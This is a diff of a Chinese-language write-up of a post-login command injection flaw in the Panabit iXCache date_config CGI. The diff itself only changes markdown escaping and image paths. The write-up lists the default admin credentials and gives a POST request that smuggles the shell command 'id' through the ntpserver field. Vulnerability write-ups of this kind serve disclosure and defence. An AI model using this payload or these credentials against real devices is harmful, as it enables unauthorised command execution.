@@ -1,8 +1,8 @@
-# Panabit iXCache date_config 后台命令执行漏洞
+# Panabit iXCache date\_config 后台命令执行漏洞
 
 ## 漏洞描述
 
-Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令
+Panabit iXCache date\_config模块存在命令拼接，导致可执行任意命令
 
 ## 漏洞影响
 
@@ -20,7 +20,7 @@ title="iXCache"
 
 登录页面
 
-![image-20230314084931046](images/image-20230314084931046.png)
+![image-20230314084931046](../.gitbook/assets/image-20230314084931046.png)
 
 默认账号密码为：admin/ixcache , 存在漏洞的模块为
 
@@ -30,7 +30,7 @@ title="iXCache"
 
 找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 userverify.cgi
 
-![image-20230314085003951](images/image-20230314085003951.png)
+![image-20230314085003951](../.gitbook/assets/image-20230314085003951.png)
 
 接收请求参数的方式如下，通过快速搜索查找可能交互的地方
 
@@ -38,11 +38,11 @@ title="iXCache"
 "${REQUEST_METHOD}" = "POST"
 ```
 
-![image-20230314085018386](images/image-20230314085018386.png)
+![image-20230314085018386](../.gitbook/assets/image-20230314085018386.png)
 
 这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点
 
-![image-20230314085054479](images/image-20230314085054479.png)
+![image-20230314085054479](../.gitbook/assets/image-20230314085054479.png)
 
 ```
 #!/bin/sh
@@ -223,11 +223,11 @@ echo -n "</select>秒</td>
 ";
 ```
 
-![image-20230314085113258](images/image-20230314085113258.png)
+![image-20230314085113258](../.gitbook/assets/image-20230314085113258.png)
 
-${CGI_ntpserver} 参数可以发现，受用户可控
+${CGI\_ntpserver} 参数可以发现，受用户可控
 
-![image-20230314085129884](images/image-20230314085129884.png)
+![image-20230314085129884](../.gitbook/assets/image-20230314085129884.png)
 
 主要位置注意这个代码位置
 
@@ -237,19 +237,19 @@ echo "ntpserver_ip=${CGI_ntpserver}" > ${PGETC}/ntp.conf
 
 这里将参数写入 PGETC/ntp.conf 文件，查看文件位置，看一下变量 {PGETC} 配置
 
-![image-20230314085219275](images/image-20230314085219275.png)
+![image-20230314085219275](../.gitbook/assets/image-20230314085219275.png)
 
 在 /etc 目录下找到了这个文件
 
-![image-20230314085232050](images/image-20230314085232050.png)
+![image-20230314085232050](../.gitbook/assets/image-20230314085232050.png)
 
 继续向下看
 
-![image-20230314085244308](images/image-20230314085244308.png)
+![image-20230314085244308](../.gitbook/assets/image-20230314085244308.png)
 
 可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下
 
-![image-20230314085259742](images/image-20230314085259742.png)
+![image-20230314085259742](../.gitbook/assets/image-20230314085259742.png)
 
 构造请求
 
@@ -259,12 +259,12 @@ POST /cgi-bin/Maintain/date_config
 ntpserver=0.0.0.0;id&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
 ```
 
-![image-20230314085313769](images/image-20230314085313769.png)
+![image-20230314085313769](../.gitbook/assets/image-20230314085313769.png)
 
 成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果
 
-![image-20230314085338637](images/image-20230314085338637.png)
+![image-20230314085338637](../.gitbook/assets/image-20230314085338637.png)
 
 交互处可进行命令拼接造成注入
 
-![image-20230314085353610](images/image-20230314085353610.png)
+![image-20230314085353610](../.gitbook/assets/image-20230314085353610.png)
